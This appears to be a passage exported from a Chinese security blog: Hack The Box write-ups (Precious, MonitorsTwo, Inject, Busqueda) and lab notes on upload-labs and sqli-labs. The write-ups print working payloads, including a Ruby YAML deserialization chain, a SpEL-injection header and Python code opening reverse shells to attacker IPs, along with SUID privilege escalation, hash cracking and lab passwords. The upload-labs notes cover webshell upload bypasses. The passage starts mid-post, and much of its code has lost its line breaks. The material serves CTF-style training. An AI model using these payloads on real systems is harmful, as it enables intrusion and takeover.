secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser henry may run the following commands on precious: (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb-bash-5.1$ 通过 YAML 远程执行代码的文章，发现可以通过 dependencies.yml 文件使用远程代码注入，该文件将由 /opt/update_dependencies.rb 运行 根据 sudo -l 命令的返回结果 这说明你的目标机器上的用户 henry 可以使用 sudo 命令来以 root 权限运行以下命令，而不需要输入密码： 1/usr/bin/ruby /opt/update_dependencies.rb 复制 这可能是一个提权的机会，如果你可以控制或者修改 /opt/update_dependencies.rb 这个文件，或者利用 ruby 的特性来执行任意命令。你可以尝试以下方法： 12345cat /opt/update_dependencies.rbcat# 发现 YAML.load(File.read(&quot;dependencies.yml&quot; )) 字段test file .yml 使用 nano 编辑器 在 nano 编辑器中，按下 Ctrl+O 组合键，这会提示你输入要保存的文件名。如果你不想改变文件名，直接按下 Enter 键即可。 如果你想要退出 nano 编辑器，按下 Ctrl+X 组合键，这会提示你是否要保存修改。如果你想要保存，按下 Y 键，然后按下 Enter 键。如果你不想要保存，按下 N 键。 123# 将 /tmp/1 添加到 PATH，您可以使系统能够在该目录中查找并执行命令。export PATH=/tmp/1:$PATHecho $PATH Google 搜索：file yml rce https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/ https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e56 12345678910111213141516171819---- !ruby/object:Gem::Installer i: x- !ruby/object:Gem::SpecFetcher i: y- !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &quot;abc&quot; debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &#x27;Kernel&#x27; method_id: :system git_set: sh method_id: :resolve 123# 执行我们的命令sudo /usr/bin/ruby /opt/update_dependencies.rbpwd;id;whoami;ls -la;file root.txt","tags":["Hack The Box"],"categories":["网络安全"]},{"title":"MonitorsTwo — Hack The Box Machine","path":"/2023/03/06/MonitorsTwo/","content":"介绍 破解盒子 ：： 破解盒子 (hackthebox.com) 10.10.11.211 参考 hackthebox MonitorsTwo渗透全过程 - YouTube htb monitorstwo wp记录_春猿火的博客-CSDN博客 MonitorsTwo WriteUp_Som3B0dy的博客-CSDN博客 FredBrave/CVE-2022-46169-CACTI-1.2.22：这是 CVE-2022-46169 对仙人掌 1.2.22 的攻击。此漏洞允许通过 RCE 获取计算机上的反向外壳。 (github.com) UncleJ4ck/CVE-2021-41091: POC for CVE-2021-41091 (github.com) 探测 1nmap -A 10.10.11.211 底部看到版本信息——版本 1.2.22 | © 2004-2023 - The Cacti Group Google 搜索：The Cacti Group exploit CVE-2022-46169 反连 shell 123456789# 监听 nc -nlvp 443# 本机 git clone 把 python 脚本下载下载并且运行python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.14.29 --LPORT=443#-u http://10.10.11.211: 指定目标 URL 为 http://10.10.11.211。测试的目标网站#--LHOST=10.10.14.29: 指定本地主机的 IP 地址为 10.10.14.29。反向连接的 IP 地址。-#-LPORT=443: 指定本地主机的端口号为 443。接收反向连接的端口号。 12345678910111213141516171819202122cd /cat entrypoint.sh#!/bin/bashset -exwait-for-it db:3306 -t 300 -- echo &quot;database is connected&quot;if [[ ! $(mysql --host=db --user=root --password=root cacti -e &quot;show tables&quot;) =~ &quot;automation_devices&quot; ]]; then mysql --host=db --user=root --password=root cacti &lt; /var/www/html/cacti.sql mysql --host=db --user=root --password=root cacti -e &quot;UPDATE user_auth SET must_change_password=&#x27;&#x27; WHERE username = &#x27;admin&#x27;&quot; mysql --host=db --user=root --password=root cacti -e &quot;SET GLOBAL time_zone = &#x27;UTC&#x27;&quot;fichown www-data:www-data -R /var/www/html# first arg is `-f` or `--some-option`if [ &quot;$&#123;1#-&#125;&quot; != &quot;$1&quot; ]; then\tset -- apache2-foreground &quot;$@&quot;fiexec &quot;$@&quot;# -------------------------------------------------------------------------------------------------# 这个脚本的功能是等待数据库可用后，检查指定的表是否存在，如果不存在，则导入 SQL 文件并更新数据库中的记录。然后设置目录权限并执行传递给脚本的命令行参数。 123456789101112131415161718find / -perm -u=s 2&gt;/dev/null# find: 命令用于在文件系统中查找文件和目录。# /: 指定查找的起始路径为根目录。# -perm -u=s: 指定查找具有 Setuid 权限的文件。-perm 选项用于指定文件权限，-u 表示针对文件所有者的权限，=s 表示设置了 Setuid 权限的文件。# 2&gt;/dev/null: 将错误输出重定向到 /dev/null，即丢弃错误信息，以避免显示不必要的错误提示。/sbin/capsh --gid=0 --uid=0 --# 以 root 用户的身份运行 /sbin/capsh 工具，以便在修改进程权限和能力时拥有 root 权限whoami# 复制 entrypoint.sh 文件的命令mysql --host=db --user=root --password=root cacti -e &quot;show tables&quot;mysql --host=db --user=root --password=root cacti -e &quot;select * from user_auth&quot;# 找到 marcus 用户的密码$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C 12345678# 本机hashcat -m 3200 -a 0 pass.txt /home/aloof/zidm/common-password-list/rockyou.txt# 使用 hashcat 工具对 `pass.txt` 文件中的 bcrypt 哈希值进行直接字典攻击，并使用 `/home/aloof/zidm/common-password-list/rockyou.txt` 字典文件ssh marcus@10.10.11.211$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C 用户名 密码 明文 marcus $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C funkymonkey 12345# www-data 用户cd /cd binls -al | grep bashchmod u+s bash UncleJ4ck/CVE-2021-41091: POC for CVE-2021-41091 (github.com) 12345# 本机git clone https://github.com/UncleJ4ck/CVE-2021-41091.gitifconfigsudo python3 -m http.server 123# marcus ./exp.shchmod +x exp.sh","tags":["Hack The Box"],"categories":["网络安全"]},{"title":"Inject — Hack The Box Machine","path":"/2023/03/03/Inject/","content":"https://app.hackthebox.com/machines/Inject 参考： Google 搜索：Inject Hack The Box https://blog.csdn.net/qq_58869808/article/details/129505388 ^v^ (cnblogs.com) HTB-Inject_永远是深夜有多好。的博客-CSDN博客 视频： https://www.youtube.com/watch?v=SU_hAavi9Oo&amp;pp=ygURaW5qZWN0IGhhY2t0aGVib3g%3D 连接 使用环境 VM ubuntu 123sudo openvpn lab_Wreath0690.ovpn10.10.11.204 侦查 1234# 初始端口扫描nmap -A 10.10.11.204# 仅有 22/tcp 和 8080/tcp 两个端口是开放的，其中22/tcp 端口运行的是 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)，8080/tcp 端口运行的是 Nagios NSCA 12touch png.png# 创建一个文件进行抓包 文件包含 FUZZ 路径，一层一层进行遍历，找到了 pom.xml 文件，发现 java 框架去 Google 搜索 EXP 1234密码：DocPhillovestoInject123用户：phil# ssh phil@10.10.11.204，连接不上 1234# 执行命令 curl http://10.10.11.204:8080/show_image?img=pass1.jpg?pass=id 得到了文件的绝对路径/var/www/WebApp/src/main/uploads/pass1.jpg%3Fpass=id&#123;&quot;timestamp&quot;:&quot;2023-05-19T02:46:22.638+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;URL [file:/var/www/WebApp/src/main/uploads/pass1.jpg%3Fpass=id] cannot be resolved in the file system for checking its content length&quot;,&quot;path&quot;:&quot;/show_image&quot;&#125;root@aloof-virtual-machine:/home/aloof/tools# 反向 shell 通过搜索找到 CVE 编号是「CVE-2022-22963」 CVE-2022-22963 是一个在 Spring Cloud Function 框架中存在的远程代码执行漏洞。它影响了3.1.6、3.2.2及更早的版本 当使用路由功能时，用户可以提供一个特制的 SpEL 作为路由表达式，可能导致远程代码执行和访问本地资源。 Vulhub - Docker-Compose file for vulnerability environment 1234567curl http://10.10.11.204:8080/show_image?img=../../../../WebApp/pom.xml# 返回信息，版本满足要求&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.6.5&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; 使用 burp 抓http://10.10.11.204:8080的数据包 12345678910GET / HTTP/1.1Host: 10.10.11.204:8080User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1 Vulhub 上的 123456789101112POST /functionRouter HTTP/1.1Host: localhost:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closespring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/success&quot;)Content-Type: text/plainContent-Length: 4test 修改后 https://www.revshells.com/ 12345bash -i &gt;&amp; /dev/tcp/10.10.16.39/9001 0&gt;&amp;1# 通过 base64 加密YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS85MDAxIDA+JjE=# 监听端口，获得 shell 权限nc -nvlp 9001 修改后的请求包 12345678910111213POST /functionRouter HTTP/1.1Host: 10.10.11.204:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Accept: */*Accept-Language: enAccept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS85MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)Content-Type: text/plainContent-Length: 4test 12345678910111213141516spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS85MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)# 这段代码是一个 HTTP 请求头的参数，它的名字是 spring.cloud.function.routing-expression，它的值是一个SpEL表达式。SpEL表达式是一种可以执行任意Java代码的语言.# 这个SpEL表达式的作用是调用java.lang.Runtime类的getRuntime()方法，得到一个Runtime对象，然后调用它的exec()方法，执行一个命令行。这个命令行是我们自己可以控制的地方bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS85MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;# 这个命令行的作用是先用 echo 命令输出一串 base64 编码的字符串，然后用 base64 命令解码它，然后用 bash 命令执行它bash -i &gt;&amp; /dev/tcp/10.10.16.39/9001 0&gt;&amp;1# 这个命令的作用是启动一个交互式的 bash shell，并且把它的输入和输出重定向到一个TCP连接上，连接的目标地址是 10.10.16.39:9001。这样就相当于在服务器上开启了一个反向 shell，攻击者可以在 10.10.16.39:9001 上监听并控制服务器。# 所以，这段代码的目的是利用 Spring Cloud Function 框架中存在的 SpEL 注入漏洞，执行任意代码，并在服务器上开启一个反向 shell，从而获取服务器的完全控制权。 12345678# 连接上之后，通过 whoami 命令发现当前用户是 frank，切换到 phil 用户密码：DocPhillovestoInject123用户：philsu phil# 在 /home/phil 目录下发现 user.txt 文件，用 cat 读取文件 提权 使用 sudo -l 发现没有提权的命令 ansible playbook代码来执行shell命令。 Ansible playbook 是一种用来在远程主机上执行一系列任务的文件，它使用YAML语法1。使用Ansible playbook来执行shell命令 1234- hosts: localhost tasks: - name: getroot command: sudo chmod u+s /bin/bash Playbook 用于将 /bin/bash 文件设置为 SUID 权限，以实现以 root 用户权限执行 Bash shell 的目的 1234567891011121314151617181920ifconfig# 用sudo权限运行python3的http.server模块1，它可以在本地主机上启动一个简单的HTTP服务器，用来共享文件和目录。sudo python3 -m http.server# 用wget命令从10.10.16.39:8000这个地址下载playbook_2.yml文件，这个地址是上面的HTTP服务器提供的。wget 10.10.16.39:8000/playbook_2.ymlbash -pid whoamicd /rootlscat root.txt","tags":["Hack The Box"],"categories":["网络安全"]},{"title":"Busqueda — Hack The Box Machine","path":"/2023/03/01/Busqueda/","content":"连接 https://app.hackthebox.com/machines/Busqueda 参考： 靶场笔记-HTB Busqueda - FreeBuf网络安全行业门户 htb busqueda wp要点记录_春猿火的博客-CSDN博客 https://www.youtube.com/watch?v=I2n4SDUXEYI https://ratil.life/hack-the-box-busqueda/ https://blog.213.se/busqueda-hackthebox/ 123sudo openvpn lab_Wreath0690.ovpn10.10.11.208 侦查 1234# 初始端口扫描nmap -A 10.10.11.208# 系统——Ubuntu Searcher 2.4.0 容易受到命令注入的攻击 反弹 shell Google 搜索： “Searchor” poc vulnerabilty exploit “Searchor” exploit POC https://github.com/jonnyzar/POC-Searchor-2.4.2 12345678# 易受攻击的代码包括 eval() 方法：url = eval( f&quot;Engine.&#123;engine&#125;.search(&#x27;&#123;query&#125;&#x27;, copy_url=&#123;copy&#125;, open_web=&#123;open&#125;)&quot; ) &#x27;, exec(&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ATTACKER_IP&#x27;,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/sh&#x27;,&#x27;-i&#x27;]);&quot;))# 1engine=Ask&amp;query=&#x27;, exec(&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.10.16.8&#x27;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/sh&#x27;,&#x27;-i&#x27;]);&quot;))# 12# 另一个命令行窗口nc -lvvp 4444 进入后，有一个用户帐户“svc”，我可以得到“user.txt”。 123456789101112131415161718192021222324252627282930313233343536373839404142$ cd /var/www/app$ pwd/var/www/app$ lsapp.pytemplates$ ls -latotal 20drwxr-xr-x 4 www-data www-data 4096 Apr 3 14:32 .drwxr-xr-x 4 root root 4096 Apr 4 16:02 ..-rw-r--r-- 1 www-data www-data 1124 Dec 1 14:22 app.pydrwxr-xr-x 8 www-data www-data 4096 May 15 21:06 .gitdrwxr-xr-x 2 www-data www-data 4096 Dec 1 14:35 templates$ cd .git$ ls -latotal 52drwxr-xr-x 8 www-data www-data 4096 May 15 21:06 .drwxr-xr-x 4 www-data www-data 4096 Apr 3 14:32 ..drwxr-xr-x 2 www-data www-data 4096 Dec 1 14:35 branches-rw-r--r-- 1 www-data www-data 15 Dec 1 14:35 COMMIT_EDITMSG-rw-r--r-- 1 www-data www-data 294 Dec 1 14:35 config-rw-r--r-- 1 www-data www-data 73 Dec 1 14:35 description-rw-r--r-- 1 www-data www-data 21 Dec 1 14:35 HEADdrwxr-xr-x 2 www-data www-data 4096 Dec 1 14:35 hooks-rw-r--r-- 1 root root 259 Apr 3 15:09 indexdrwxr-xr-x 2 www-data www-data 4096 Dec 1 14:35 infodrwxr-xr-x 3 www-data www-data 4096 Dec 1 14:35 logsdrwxr-xr-x 9 www-data www-data 4096 Dec 1 14:35 objectsdrwxr-xr-x 5 www-data www-data 4096 Dec 1 14:35 refs$ cat config[core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true[remote &quot;origin&quot;] url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git fetch = +refs/heads/*:refs/remotes/origin/*[branch &quot;main&quot;] remote = origin merge = refs/heads/main$ **config **文件中拿到用户名密码 username password svc jh1usoih2bkjaspwe92 使用 ssh svc@10.10.11.208 连接用户 svc 提权 123456svc$ sudo -S -l&gt; [sudo] password for svc: jh1usoih2bkjaspwe92&gt; ... snip ...&gt;&gt; User svc may run the following commands on busqueda:&gt; (root) /usr/bin/python3 /opt/scripts/system-checkup.py * 12345678910111213141516svc$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py /etc/passwd&gt; Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)&gt;&gt; docker-ps : List running docker containers&gt; docker-inspect : Inpect a certain docker container&gt; full-checkup : Run a full system checkup# 用户 svc 在 busqueda 上具有特权执行脚本 system-checkup.py 的能力# 用户 svc 试图使用 sudo 执行 /usr/bin/python3 /opt/scripts/system-checkup.py /etc/passwd 命令，其中 /etc/passwd 被作为参数传递给 system-checkup.py 脚本# 脚本的用法提示system-checkup.py 脚本支持以下动作选项：docker-ps：列出正在运行的 Docker 容器。docker-inspect：检查特定的 Docker 容器。full-checkup：运行完整的系统检查。 现在需要知道 full-chesckup 子命令的运行方式 创建一个脚本full-checkup.sh，将反向 shell 填充到里面以进行 root 权限升级 touch full-checkup.sh vim full-checkup.sh 1234567891011#!/usr/bin/python3import socketimport subprocessimport oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;10.10.16.8&quot;,4441))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)import ptypty.spawn(&quot;sh&quot;) chmod +x full-checkup.sh sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup 12345nc -nlvp 4441ls /rootcat /root/root.txt","tags":["Hack The Box"],"categories":["网络安全"]},{"title":"Upload-labs 靶场","path":"/2023/03/01/Upload-labs/","content":"项目地址：https://github.com/c0ny1/upload-labs 一、前端 JS 检测绕过 上传一个 php 文件，失败了，只允许图片为后缀的文件进行上传。这一关的关键是*“JavaScript 代码对文件后缀进行校验”*。JavaScript 属于前端范畴，而前端校验不会发出数据包，不会与服务器进行交互 第一种方式：浏览器直接 F12，找到checkFile()函数，进行删除。更为极端的方法是F12 --&gt; F1 --&gt; 禁用JavaScript，最后上传 PHP 木马 第二种方式：用 burp 拦截上传数据包， 对文件名进行修改 第一种方式： 删除 checkFile() 函数 极端的方法 **第二种方式：**传一个.jpg格式的图片，用 burp 抓包修改文件名和文件内容 二、MIME 类型检测绕过 MIME 是描述*消息内容类型*的因特网标准——MIME 参考手册 Content-Type 通常出现在 HTTP 请求头部中，指示请求的数据类型，或者是数据的 MIME 类型 1234# 常见的 MIME 类型text/plain：纯文本text/html：HTML 格式的文档image/png：PNG 格式的图片 这一关的关键是，使用Content-Type字段的值判断上传文件是否合法，只允许 image/jpeg、image/png、image/gif 文件的上传 用 burp 截取并修改数据包中的 Content-Type 类型进行绕过 三、后缀检测-黑名单绕过 黑名单绕过的常见方式有： 改变文件后缀名，使用不在黑名单中的文件后缀，例如php2、php3、php4、php5、phtm 拼接文件名 使用压缩文件 修改文件内容 …… 通过 burp 拦截修改数据包中的文件名后缀为.php5 如果服务器是 Apache，也可用.htaccess来进行绕过，但是文件会在上传的过程中修改文件名 四、后缀检测-黑名单绕过（.htaccess） .htaccess文件可以被用来限制特定的文件类型的上传或执行。从源码中得知没有对.htaccess限制 上传.htaccess文件，写入以下内容 12# .shell 文件会被解析为 php 文件AddType application/x-httpd-php .shell 然后上传一个后缀名为.shell的文件，执行 webshell 五、后缀检测-后缀名点空格绕过 双写小数点，. .——中间是空格，围绕着小数点 由于一些操作系统和文件系统*不允许文件名以点号结尾，因此上传时会自动删除*最后一个点号 六、后缀检测-后缀名大小写绕过 观察源代码，发现服务器检查后缀忽视了“大小写”的检测，也就是没出现“strtolower() 函数”。 而“strtolower() 函数”用于将字符串中的所有字符转换为小写字母 七、后缀检测-后缀名空格绕过 观察源代码，发现服务器检查后缀忽视了“空格”的检测，也就是没出现“trim() 函数”。 trim()是 PHP 中的一个字符串函数，用于*删除字符串首尾的空格*或其他指定字符 理应加上$file_ext = trim($file_ext); 八、后缀检测-后缀名点绕过 观察源代码，发现服务器检查后缀忽视了“后缀名点”的检测，也就是没出现“deldot() 函数”。 deldot()函数用于在文件上传*防止后缀名点绕过攻击*。该函数的作用是将文件名中的所有点（包括后缀名点和其他点）都删除，以确保文件名的完整性和正确性。 上传文件并用 burp 抓包，在文件名中添加*额外的点*来绕过文件扩展名的检查 九、后缀检测-特殊字符串 可以通过在文件名中添加::$DATA来告诉 Windows 访问文件的资源，并将其当作可执行代码来执行 十、后缀检测-点空格绕过 同第五关 观察代码，发现先删除文件名末尾点.，再首尾去空格，由此想到 双写小数点，. .——中间是空格，围绕着小数点 十一、后缀检测-后缀名双写绕过 使用了str_ireplace()函数，替换成空，可以用双写绕过 上传文件名 code.p.phphp，上传文件时会删除 .php，最后的上传文件名： code.php 十二、后缀检测-GET方式00截断 %00 截断，用在 php 版本 5.3.29以下，magic_quotes_gpc 为 Off 状态 通过抓包，能够看到上传路径，使用 00 截断，抓包修改上传路径save_path=../upload/code.php%00，即可绕过。 “00截断”（Null byte injection）是一种 Web 应用程序安全漏洞，攻击者通过在输入数据中插入 ASCII 码为 0 的 null 字符（\\x00），来绕过字符串截断等安全措施，导致应用程序执行意外的操作或暴露敏感信息。 十三、后缀检测-POST方式00截断 GET 会自行解码%00，POST 不会自行解码 十四、内容检测-文件头检测绕过 检测文件头，源码会根据图片的*前两个字节*来判定文件类型，所以需要把 webshell 的后缀改为图片格式 制作图片木马 1copy code.jpg /b + code.php /a webshell.jpg 十五、内容检测-getimagesize()函数 getimagesize()函数来验证是否是图片。依旧是生成带有 php 代码的图片，进行上传 十六、内容检测-exif_imagetype()函数 使用exif_imagetype函数来检查是否是图片，读取图像的第一个字节并检查其签名。依旧是生成带有 php 代码的图片，进行上传 十七、内容检测-图片二次渲染绕过 图片的二次渲染会把第一次渲染添加的 PHP 代码删掉。 绕过的方式是，查看*图片的渲染后没有修改的位置*，添加一句话木马 未完待续……","tags":["文件上传"],"categories":["网络安全"]},{"title":"sqli-labs 靶场使用 SQLMap 注入（1-25 关）","path":"/2023/02/28/sqli-labs-SQLMap/","content":"注意点： sqlmap 需要 python 的环境，并配置环境变量 在实际检测过程中，sqlmap 会不停的询问，需要手工输入Y/N来进行下一步操作，可以使用参数--batch命令来自动答复和判断 用 sqlmap 工具注入完毕后，C 盘 AppData 文件夹下会有缓存文件夹，不删掉的话会影响 SQL 注入结果C:\\Users\\20846\\AppData\\Local\\sqlmap\\output，也可用sqlmap.py --purge来清空缓存 Less-1 123python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; --batch --banner# --batch 从不询问用户输入，使用所有默认配置，换言之对所有的交互式的都是默认的# -b, --banner 获取数据库管理系统的标识 12# 查看数据库python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; --dbs 爆出数据库名 12# sqlmap -u [&quot;URL&quot;] -D [&quot;数据库名&quot;] --tables //查询当前数据库中的所有表python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; -D security --tables 查询 security 数据库中的所有表 12# sqlmap -u [&quot;URL&quot;] -D [&quot;数据库名&quot;] -T [&quot;表名&quot;] --columns //查询指定库中指定表的所有列(字段)python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; -D security -T users --columns 查看 security 数据库下的 users 表里都有哪些字段 123456# sqlmap -u -D security -T users -C id,password,username --dump# 爆出数据库 security 中的 users 表中的 id,password,username 列中的所有数据python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; -D security -T users -C id,password,username --dump# --dump 将结果保存下来 查看列字段的具体值 因此，只要能找到注入点和数据库，就算上成功了 Less-2 以下操作都是基于 Less-1 的步骤，如法炮制而来 1sqlmap -u http://localhost/sqli-labs/Less-2/?id=1 --batch --dbs 找到数据库 Less-3 1sqlmap -u http://localhost/sqli-labs/Less-3/?id=1 --batch --dbs Less-4 1sqlmap -u http://localhost/sqli-labs/Less-4/?id=1 --batch --dbs Less-5 1sqlmap -u http://localhost/sqli-labs/Less-5/?id=1 --batch --dbs Less-6 1sqlmap -u http://localhost/sqli-labs/Less-6/?id=1 --batch --dbs Less-7 1sqlmap -u http://localhost/sqli-labs/Less-7/?id=1 --batch --dbs Less-8 1sqlmap -u http://localhost/sqli-labs/Less-8/?id=1 --batch --dbs Less-9 1sqlmap -u http://localhost/sqli-labs/Less-9/?id=1 --batch --dbs Less-10 12sqlmap -u http://localhost/sqli-labs/Less-10/?id=1 -level=2 --batch --dbs# 当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入 Less-11 1234567sqlmap -u http://localhost/sqli-labs/Less-11/index.php --batch --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --dbs # 从该关开始，注入的位置不再是 URL，且请求变为了 POST，因此命令要随之而变。对于是 post 提交数据的 URL，需要指定其 data 参数，--data 能够抓取其 post 提交的数据填入# 还有一种方法是：因为 Less-11 该关需要进行登录，可以先用账号 admin 密码 admin 登录，然后用 burp 抓包，将 burp 抓取的包保存为 target.txt，利用 sqlmap -r target.txt 命令，来探测 target.txt 文件中的 http 数据包是否存在 sql 注入漏洞sqlmap -r target.txt Less-12 1sqlmap -u http://localhost/sqli-labs/Less-12/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs Less-13 1sqlmap -u http://localhost/sqli-labs/Less-13/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs Less-14 1sqlmap -u http://localhost/sqli-labs/Less-14/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs Less-15 1sqlmap -u http://localhost/sqli-labs/Less-15/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --dbs --batch 以下略去 Less-16 1sqlmap -u http://localhost/sqli-labs/Less-16/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs --level=2 Less-17 1sqlmap -u http://localhost/sqli-labs/Less-17/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs Less-18 12345# 注入的位置在 User-Agent 中sqlmap -u http://localhost/sqli-labs/Less-18/ --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --user-agent=&quot;*&quot; --thread=10 --dbs # --thread=10，设置多线程，并行处理请求加快效率# --user-agent=&quot;*&quot; 是用来指定 User-Agent Less-19 1234# 注入的位置在 Referer 中sqlmap -u &quot;http://localhost/sqli-labs/Less-19/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --referer=&quot;*&quot; --thread=10 --dbs# --referer，伪造 referer 字段 Less-20 12345# 注入的位置在 cookie 中sqlmap -u http://localhost/sqli-labs/Less-20/index.php --cookie=&quot;uname=admin&quot; --dbs --batch --level=5 --risk=3 # 同样，可以用 burp 抓包保存 ，殊途同归，第一次失败了，于是提高了线程，这将导致查询速度降低sqlmap -r target-20.txt --leve=5 --risk=3 --dbs Less-21 12# 注入的位置依旧在 cookie 中，但经过了 base64 加密的，用 sqlmap 来进行联合查询注入sqlmap -u http://localhost/sqli-labs/Less-21/index.php --cookie=&quot;uname=*&quot; --dbs --tamper &quot;base64encode.py&quot; --batch 1234567sqlmap -u http://localhost/sqli-labs/Less-21/index.php --cookie=&quot;uname=*&quot; --tamper=&quot;base64encode&quot; --dbms=MySQL --random-agent --flush-session --technique=U --dbs --batch -v 3# --random-agent --&gt; 使用任意的User-Agent爆破# --flush-session --&gt; sqlmap 扫描的时候会将缓存的数据记录到 output 文件下，下次扫描时会直接调用本地缓存的扫描结果。如果我们想删除缓存结果，重新对某网站进行扫描就需要添加 --flush-session 选项。# --dbms=MySQ --&gt; 指定其数据库为mysql# --tamper base64encode --&gt; 对提交的数据进行base64编码# --technique=U --&gt; 指定注入点类型，u 是指的 union 联合查询注入。其他还有 U/B/T/S# -v --&gt; 3 能看到 payload Less-22 1sqlmap -u http://localhost/sqli-labs/Less-22/index.php --cookie=&quot;uname=*&quot; --dbs --tamper &quot;base64encode.py&quot; --batch Less-23 1sqlmap -u http://localhost/sqli-labs/Less-23/?id=1 --dbs --batch Less-24 1234# 这关是二次注入，二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。# 需要先注册账号 admin&#x27;#，然后修改密码，后面的 # 号注释掉了# Sql 语句变为UPDATE users SET passwd=&quot;New_Pass&quot; WHERE username =&#x27; admin&#x27; # &#x27; AND password=&#x27; Less-25 1sqlmap -u http://localhost/sqli-labs/Less-25/?id=1 --dbs --batch","tags":["SQL注入"],"categories":["网络安全"]},{"title":"sqli-labs 靶场（手工注入）","path":"/2023/02/28/sqli-labs/","content":"前言 参考： SQLI labs 靶场精简学习记录 https://github.com/Audi-1/sqli-labs 工具方面可用老版本的 Hackerbar，以及抓包工具 Burpsuite Less-1 可先查看数据库的记录次数 一直增大 id 的值，当 id 的值大于 14，得到的是一个没有用户名和密码的空白页面，这意味着数据库只有 14 条记录 ?id=1 …… ?id=14 12345678910**但是我们并不知道开发者具体是怎样封装 id 参数值的。所以得先找封装形式**- 使用基于错误返回的 SQL 注入，单引号`&#x27;`或者转义符`\\` > 通过转义字符来找出 参数封装形式，在MYSQL中 &#x27;\\&#x27;(反斜杠)被用来转义一个字符。转义一个字符意味着取消该字符的特殊用途。使用转义字符可以得到更清楚的图片。- ```sql ?id=1&#x27; ?id=1\\ less-1 到 less-4 的封装形式 